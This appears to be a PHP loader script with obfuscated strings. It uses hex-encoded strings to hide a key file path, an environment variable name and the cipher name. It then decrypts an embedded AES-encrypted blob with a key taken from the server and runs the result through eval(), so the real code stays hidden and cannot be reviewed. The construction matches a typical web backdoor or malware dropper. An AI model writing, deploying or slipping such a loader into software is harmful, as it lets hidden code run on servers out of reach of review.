<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('rfYkttBdlc//ohjKaZj8XA==');

$c=base64_decode(

'ZOhTMUysUtZ68ltwtiHkCvW12qacp2GzHW+Gt42tLQGCBb+LEsFEuHcJ91h2t4sKTQXmFp/SHkYI' .
'A+926Nk9u6KJglxIcyjlilq9Nn1rgzehetk1mK7DHJfEaJ3YtiLm7N8muxWbz0u9+abPJWR63qJ8' .
'qqlic6OVHxNVIdRTeIhm8udvFwXPsxfpDcevUhKCbpcgETRz7Vjfo0RsBpbTw09xxr5OC60TMUKs' .
'c6phj8FkSXp0VR06XXd5K7nCPoQ0IMvsXqQ2NoO4O0X1lpLc+0FHX2v3jjwkaLF9TDlGyzLV3zH5' .
'0xcIfK4CzPsZ7S7a9KHWEOMQJ4+aaQJxOm+VgMPVuennYhktofo3tSkM68G2XAwekYk0tXQbSeAP' .
't9l0KtX+aA+fyMuHbbWArTvpSPOY1PeDU7fB4M7Pr63h/xYB81gfxJYYqHvTsVCbD22HEYXpn8Nf' .
'ED1lbSdbeFugTFry+5WP6LrD8DiXiQpqCAUzTFxsMlOmF+dSXRDbmUzjYi1bo/aaWCo+gZk3e8o6' .
'lU8VvoTBlHMet8HNBk6RtDTPgXHGYdp+Wn6dnglYDEZK9uDxKph3m9qD1ySnppDxU798vYNjVWGk' .
'bcr/Q4gb7y1fNVLV6HVSN7oESP1LQk8oQG2beb28ue7iCezYe6oMJANRqoy5KLENapANGm2x7gPu' .
'fWrssOPR0pLGkDdoGMfwqOkXc3XjYGaFFMFmGHdPpg=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

